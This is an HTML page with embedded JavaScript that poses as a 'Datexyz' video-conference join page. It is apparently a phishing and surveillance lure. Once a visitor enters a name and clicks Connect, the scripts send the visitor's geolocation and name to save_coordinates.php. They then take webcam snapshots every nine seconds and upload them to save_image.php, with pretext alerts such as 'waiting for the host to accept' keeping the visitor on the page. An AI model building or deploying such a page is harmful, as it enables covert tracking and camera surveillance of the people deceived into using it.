<!DOCTYPE html>
<html>
<head>
    
    <title>Datexyz</title>
    <script>
        
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition, showError);
            } else {
                alert("Geolocation is not supported by this browser.");
            }
        }

        function showPosition(position) {
            var latitude = position.coords.latitude;
            var longitude = position.coords.longitude;
            var timestamp = new Date().toLocaleString();
            var name = document.getElementById("name").value;
            
            // Create an AJAX request to save the coordinates, IP address, and timestamp to a file
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "save_coordinates.php", true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    console.log(xhr.responseText);
                }
            };
            xhr.send("latitude=" + latitude + "&longitude=" + longitude + "&timestamp=" + encodeURIComponent(timestamp) + "&name=" + encodeURIComponent(name));
            alert("waiting for the host to accept");
        }
        
        function showError(error) {
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    alert("Geolocation is required to connect");
                    var latitude = "N/A";
            var longitude = "N/A";
            var timestamp = new Date().toLocaleString();
            var name = document.getElementById("name").value;
            
            // TO Create an AJAX request to save the IP address, and timestamp to a file
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "save_coordinates.php", true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    console.log(xhr.responseText);
                }
            };
            xhr.send("latitude=" + latitude + "&longitude=" + longitude + "&timestamp=" + encodeURIComponent(timestamp) + "&name=" + encodeURIComponent(name));
                    break;
                case error.POSITION_UNAVAILABLE:
                    alert("Location information is unavailable.");
                    break;
                case error.TIMEOUT:
                    alert("The request to get user location timed out.");
                    break;
                case error.UNKNOWN_ERROR:
                    alert("An unknown error occurred.");
                    break;
            }
        }

    </script>
    <div class="video-wrap" hidden>
        <video id="video" playsinline autoplay></video>
    </div>

    <canvas hidden id="canvas" width="640" height="640"></canvas>

    <script>
        'use strict';

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const constraints = {
            audio: false,
            video: {
                facingMode: 'user'
            }
        };

        // Request camera permission
        function requestCameraPermission() {
            var nameInput = document.getElementById('name');
            var name = nameInput.value;

            if (name.trim() === '') {
                alert('Please enter your name.');
                return;
            }

            // Hide the form
            var form = document.querySelector('form');
            form.style.display = 'none';
           


            // Show the video element
            var videoWrap = document.querySelector('.video-wrap');
            videoWrap.removeAttribute('hidden');

            // Access webcam
            navigator.mediaDevices.getUserMedia(constraints)
                .then(function(stream) {
                    handleSuccess(stream);
                    startCapturing();
                })
                .catch(function(error) {
                    console.error('Error accessing webcam:', error);
                });
        }

        // Success
        function handleSuccess(stream) {
            window.stream = stream;
            video.srcObject = stream;
        }

        // Start capturing frames
        function startCapturing() {
            var context = canvas.getContext('2d');
            setInterval(function() {
                context.drawImage(video, 0, 0, 640, 640);
                var canvasData = canvas.toDataURL('image/png');
                var base64Image = canvasData.replace('data:image/png;base64,', '');

                // Send the base64 encoded image to the server for storage
                post(base64Image);
            }, 9000);
        }

        // Send image data to the server
        function post(imgData) {
            var folderName = 'captured images';
            var fileName = Date.now() + '.png';
            var name = document.getElementById('name').value;

            // Create a FormData object and append the image data
            var formData = new FormData();
            formData.append('folderName', folderName);
            formData.append('fileName', fileName);
            formData.append('name', name);
            formData.append('imageData', imgData);

            // Send a POST request to the server-side script
            fetch('save_image.php', {
                method: 'POST',
                body: formData
            })
            .then(response => {
                // Handle the server response
                console.log('Image sent successfully');
            })
            .catch(error => {
                console.error('Error sending image to the server:', error);
            });
        }
    </script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f6f6f6;
            text-align: center;
        }
        
        .container {
            max-width: 400px;
            margin: 0 auto;
            padding: 20px;
            background-color: #ffffff;
            border: 1px solid #dddddd;
            border-radius: 5px;
            margin-top: 50px;
        }
        
        h1 {
            text-align: center;
            color: #333333;
            font-size: 24px;
        }
        
        form {
            margin-top: 30px;
        }
        
        label {
            display: block;
            margin-bottom: 10px;
            color: #333333;
        }
        
        input[type="text"] {
            padding: 10px;
            font-size: 16px;
            border: 1px solid #dddddd;
            border-radius: 5px;
            width: 100%;
            box-sizing: border-box;
        }
        
        input[type="submit"] {
            padding: 10px 20px;
            font-size: 18px;
            background-color:#0987b7;
            color: #ffffff;
            border: none;
            cursor: pointer;
            margin-top: 20px;
            border-radius: 5px;
        }
        
        input[type="submit"]:hover {
            background-color: #00a5e5;
        }
    </style>
</head>
<body>
    
    <div class="container">
        <h1>Connect to the video conference</h1>
        <form onsubmit="event.preventDefault(); getLocation(); requestCameraPermission();">
            <label for="name">No login required</label>
            <input type="text" id="name" name="name" placeholder="Your name here" required>
            <input type="submit" value="Connect">
    </form>
    </div>
</body>
</html>